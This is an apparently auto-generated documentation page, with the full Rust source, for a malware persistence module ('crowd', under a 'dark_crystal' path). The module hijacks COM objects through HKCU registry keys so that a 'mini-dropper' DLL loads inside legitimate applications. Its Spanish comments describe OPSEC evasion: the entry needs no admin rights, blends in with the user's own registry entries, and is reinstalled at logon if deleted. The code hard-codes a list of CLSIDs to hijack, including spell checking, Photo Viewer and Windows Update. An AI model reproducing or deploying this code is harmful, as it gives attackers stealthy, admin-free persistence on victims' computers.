# crowd — persist/com_hijack.rs

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/persist/com_hijack.rs` |
| **Lines** | 98 |
| **Cards** | T008-persistence |
| **Role** | COM hijack persistence |

## Purpose

# crowd — persist/com_hijack.rs

## COM Object Hijacking HKCU (P1)

Registrar en HKCU\Software\Classes\CLSID\{clsid}\InprocServer32 el path
del mini-dropper. Sin admin — HKCU siempre es escribible.

### Cómo funciona
COM busca HKCU antes que HKLM para InprocServer32. Si la app target intenta
cargar el CLSID hijackeado, COM carga nuestra DLL (mini-dropper) en su proceso.

### Fingerprinting previo
En producción, el CLSID debe seleccionarse dinámicamente:
1. Enumerar aplicaciones instaladas (HKLM\...\Uninstall)
2. Para cada una, identificar CLSIDs que registra en HKLM\Classes\CLSID
3. Preferir CLSIDs con `ThreadingModel=Apartment` y AppID de apps de Office,
Adobe, o similares (alta frecuencia de uso)

### OPSEC
- HKCU: sin admin, sin elevation prompt
- El entry aparece mezclado con registros legítimos del usuario
- Si se borra → P2 (NTFS EA) lo reinstala en el siguiente logon

## Constants

- `INPROC_KEY`: `&str` = `"InprocServer32"`
- `THREADING`: `&str` = `"ThreadingModel"`
- `APARTMENT`: `&str` = `"Apartment"`

## Public API

### `install` (line 34)
```rust
pub fn install(clsid: &str, dropper_path: &str) -> Result<()>
```
Instala el COM hijack para el CLSID dado con el dropper en `dropper_path`.

### `is_installed` (line 53)
```rust
pub fn is_installed(clsid: &str) -> bool
```
Verifica si el hijack ya está instalado.

### `remove` (line 65)
```rust
pub fn remove(clsid: &str) -> Result<()>
```
Elimina el hijack (cleanup).

### `auto_select_clsid` (line 75)
```rust
pub fn auto_select_clsid() -> Option<String>
```
Selecciona automáticamente un CLSID objetivo común para COM hijacking.
Preferencia: Office, Adobe, Windows shell CLSIDs no protegidos.
Retorna el primero encontrado en HKLM que NO existe en HKCU.

## Key Dependencies

- `use anyhow::{anyhow, Result};`
- `use winreg::{RegKey, enums::*};`

## Full Source

```rust
//! # crowd — persist/com_hijack.rs
//!
//! ## COM Object Hijacking HKCU (P1)
//!
//! Registrar en HKCU\Software\Classes\CLSID\{clsid}\InprocServer32 el path
//! del mini-dropper. Sin admin — HKCU siempre es escribible.
//!
//! ### Cómo funciona
//! COM busca HKCU antes que HKLM para InprocServer32. Si la app target intenta
//! cargar el CLSID hijackeado, COM carga nuestra DLL (mini-dropper) en su proceso.
//!
//! ### Fingerprinting previo
//! En producción, el CLSID debe seleccionarse dinámicamente:
//! 1. Enumerar aplicaciones instaladas (HKLM\...\Uninstall)
//! 2. Para cada una, identificar CLSIDs que registra en HKLM\Classes\CLSID
//! 3. Preferir CLSIDs con `ThreadingModel=Apartment` y AppID de apps de Office,
//!    Adobe, o similares (alta frecuencia de uso)
//!
//! ### OPSEC
//! - HKCU: sin admin, sin elevation prompt
//! - El entry aparece mezclado con registros legítimos del usuario
//! - Si se borra → P2 (NTFS EA) lo reinstala en el siguiente logon

#![allow(dead_code)]

use anyhow::{anyhow, Result};
use winreg::{RegKey, enums::*};

const INPROC_KEY: &str    = "InprocServer32";
const THREADING:  &str    = "ThreadingModel";
const APARTMENT:  &str    = "Apartment";

/// Instala el COM hijack para el CLSID dado con el dropper en `dropper_path`.
pub fn install(clsid: &str, dropper_path: &str) -> Result<()> {
    let key_path = format!(r"Software\Classes\CLSID\{}\InprocServer32", clsid);

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey(&key_path)
        .map_err(|e| anyhow!("COM hijack: create_subkey failed: {}", e))?;

    // Default value = DLL path
    key.set_value("", &dropper_path)
        .map_err(|e| anyhow!("COM hijack: set default value failed: {}", e))?;

    // ThreadingModel = Apartment (most common — minimizes activation errors)
    key.set_value(THREADING, &APARTMENT)
        .map_err(|e| anyhow!("COM hijack: set ThreadingModel failed: {}", e))?;

    Ok(())
}

/// Verifica si el hijack ya está instalado.
pub fn is_installed(clsid: &str) -> bool {
    let key_path = format!(r"Software\Classes\CLSID\{}\InprocServer32", clsid);
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    if let Ok(key) = hkcu.open_subkey(&key_path) {
        let val: Result<String, _> = key.get_value("");
        val.is_ok()
    } else {
        false
    }
}

/// Elimina el hijack (cleanup).
pub fn remove(clsid: &str) -> Result<()> {
    let key_path = format!(r"Software\Classes\CLSID\{}", clsid);
    RegKey::predef(HKEY_CURRENT_USER)
        .delete_subkey_all(&key_path)
        .map_err(|e| anyhow!("COM hijack remove: {}", e))
}

/// Selecciona automáticamente un CLSID objetivo común para COM hijacking.
/// Preferencia: Office, Adobe, Windows shell CLSIDs no protegidos.
/// Retorna el primero encontrado en HKLM que NO existe en HKCU.
pub fn auto_select_clsid() -> Option<String> {
    // Targets conocidos y efectivos (alta frecuencia de uso en sistemas Windows típicos)
    let candidates = [
        "{BCDE0395-E52F-467C-8E3D-C4579291692E}", // MsSpellCheckingFacility
        "{b4bab081-ef08-11e3-848d-b8e856428d4f}", // Shell ItemNameDisplay
        "{9AC9FBE1-E0A2-4ad6-B4EE-E212013EA917}", // Windows Photo Viewer
        "{4315D437-5B8C-11D0-BD3B-00A0C911CE86}", // Device properties
        "{C2FBB630-2971-11D1-A18C-00C04FD75D13}", // Windows Update
    ];

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    for clsid in &candidates {
        let key_path = format!(r"Software\Classes\CLSID\{}", clsid);
        // Only hijack if not already in HKCU
        if hkcu.open_subkey(&key_path).is_err() {
            // Verify it exists in HKLM (so there's a real COM registration to piggyback)
            let hklm_path = format!(r"Software\Classes\CLSID\{}", clsid);
            if RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(&hklm_path).is_ok() {
                return Some((*clsid).to_string());
            }
        }
    }
    None
}

```